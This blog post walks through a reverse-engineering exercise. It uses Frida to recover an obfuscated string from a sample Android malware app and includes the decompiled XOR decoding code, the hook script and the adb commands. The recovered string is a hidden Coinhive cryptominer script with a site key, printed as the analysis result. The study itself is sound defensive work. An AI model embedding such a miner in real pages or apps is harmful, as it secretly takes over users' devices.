---
layout: post
title: "Deobfuscating with Frida Exercise"
date: 2022-07-06
---

Lately been diving a little deeper into my side journey with Android app reversing.

I went over Maddie Stone's amazing Android Reversing course [here](https://www.ragingrock.com/AndroidAppRE/app_fundamentals.html). I decided to take on one exercise at a time. The [last exercise](https://www.ragingrock.com/AndroidAppRE/obfuscation.html#exercise-7---string-deobfuscation) in the course goes over string deobfuscation. There are Java methods that are passed in app to take a mysterious obfuscated string and reverse it back to being human readable for a Webview method to load it.

```
webView.loadData(z1.b(new String(z1.a("773032205849207A38313
26F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B531637352
22D393B475C7A37222D7F38421B6A6664303220584920647730322058492
0643D2223725C503A3F39636C725F5C237A082C383C7950223F65023F3D5
F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B1
01F42700D1F39331717161574213F2B2337505D27606B712C7B0A543D342
E317F214558262E636A6A6E1E4A37282233256C"), Charset.forName("UTF-8"))), "text/html", null);
```

In the exercise, it was cracked by reimplementing the methods in Python and mirroring the code to deobfuscate the string. However, I came across an [interesting tutorial](https://1337.dcodx.com/mobile-security/owasp-mstg-crackme-1-writeup-android) using [Frida](https://frida.re/). A "Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers." Being a Frida novice I wanted to take the time to learn more beyond using given scripts. Even though the community scripts are very very useful! With Frida, you can utilize and load the classes and methods to sort of "replay" what the app is doing with the data passed to it. So, combining this knowledge with the exercise from Maddie's course, I tried my hand at dynamically cracking the string using the methods as given in the example app.

I. Install the app on an Android device. I grabbed the `.apk` out of the VM given in the exercise from Android RE course and installed on an emulated Android.

`adb install apks\ClashOfLights.apk`

Side note: I already have Android Studio installed and like it for a few reasons. Not only does it have Android Emulator tool, but you can add a JADX-GUI plugin to decompile APKs.

II. Write the Javascript hook Frida will use.

Looking at this code snippet, I threw in the one class and 2 methods I would need.

```
package com.supercell.titan;

/* loaded from: classes.dex */
public class z1 {
    private static final char[] a = "0123456789ABCDEF".toCharArray();

    public static byte[] a(String str) {
        int length = str.length();
        byte[] bArr = new byte[length / 2];
        for (int i = 0; i < length; i += 2) {
            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));
        }
        return bArr;
    }

    public static String b(String str) {
        char[] cArr = {'K', 'C', 'Q', 'R', '1', '9', 'T', 'Z'};
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            sb.append((char) (str.charAt(i) ^ cArr[i % cArr.length]));
        }
        return sb.toString();
    }
}
```

So I need class `z1` and it's methods, `a` and `b`.

**deob.js**
```

setImmediate(function() {
    console.log("[*] Start");

    Java.perform(function() {

        var str = "773032205849207A3831326F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B53163735222D3
        93B475C7A37222D7F38421B6A66643032205849206477303220584920643D2223725C503A3F39636C725F5C237A082C3
        83C7950223F65023F3D5F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B101F42700D1F39331
        717161574213F2B2337505D27606B712C7B0A543D342E317F214558262E636A6A6E1E4A37282233256C"

        console.log("[*] Loading z1")
        var clazz_z1 = Java.use('com.supercell.titan.z1');
        // var bytes = clazz_z1.a(str); For some reason the byte array had spaces so had I just hardcoded it below for clarity of what method z1.a does...
        console.log("[*] UTF-8 String from Byte array created from clazz_z1.a(str)")
        var str2 = String.fromCharCode(119,48,50,32,88,73,32,122,56,49,50,111,19,81,32,46,59,48,107,125,30,90,59,
        51,37,43,56,36,84,23,55,53,38,108,61,59,83,22,55,53,34,45,57,59,71,92,122,55,34,45,127,56,66,27,106,102,
        100,48,50,32,88,73,32,100,119,48,50,32,88,73,32,100,61,34,35,114,92,80,58,63,57,99,108,114,95,92,35,122,
        8,44,56,60,121,80,34,63,101,2,63,61,95,64,57,53,62,48,121,117,95,95,102,110,17,52,20,31,92,76,100,55,122,
        27,103,31,86,90,27,44,127,123,16,31,66,112,13,31,57,51,23,23,22,21,116,33,63,43,35,55,80,93,39,96,107,113,
        44,123,10,84,61,52,46,49,127,33,69,88,38,46,99,106,106,110,30,74,55,40,34,51,37,108)
        console.log("[*] Using method b from class z1")
        var result = clazz_z1.b(str2);
        console.log()
        console.log("****** DEOBFUSCATED STRING ******")
        console.log(result)
        console.log("****** DEOBFUSCATED STRING ******")
        console.log()
    })
    
    console.log("[*] End");

})

```

Not pretty, but does the job!


III. Orchestrate the Frida server on the emulated Android and then hook this JS into the app to run.


`adb push ./frida-server-15.1.20-android-x86 /data/local/tmp/frida-server` <--- based on architecture of the device. Frida docs are great with guiding with this but I also like [this tutorial's](https://httptoolkit.tech/blog/frida-certificate-pinning/#install-and-start-frida-on-the-device) steps.

`adb root`

`adb shell "chmod 755 /data/local/tmp/frida-server"`

`frida -U -l ./deob.js -f com.clashof.lights`s

Running this I got:

```
C:\Users\Alexis\platform-tools>frida -U -l ./deob.js -f com.clashof.lights
     ____
    / _  |   Frida 15.1.20 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to Android Emulator 5554 (id=emulator-5554)
Spawning `com.clashof.lights`...
[*] Start
[*] End
Spawned `com.clashof.lights`. Use %resume to let the main thread start executing!
[Android Emulator 5554::com.clashof.lights ]-> %resume


Frida Output

[*] Start
[*] Loading z1
[*] UTF-8 String from Byte array created from clazz_z1.a(str)
[*] Using method b from class z1

****** DEOBFUSCATED STRING ******
<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
****** DEOBFUSCATED STRING ******

[*] End
```

There you go, the deobfuscated string dynamically grabbed through Frida! I suspect this type of obfuscation method isn't necessarily that common. But I plan to use this use case for other types of dynamic analysis in the future!
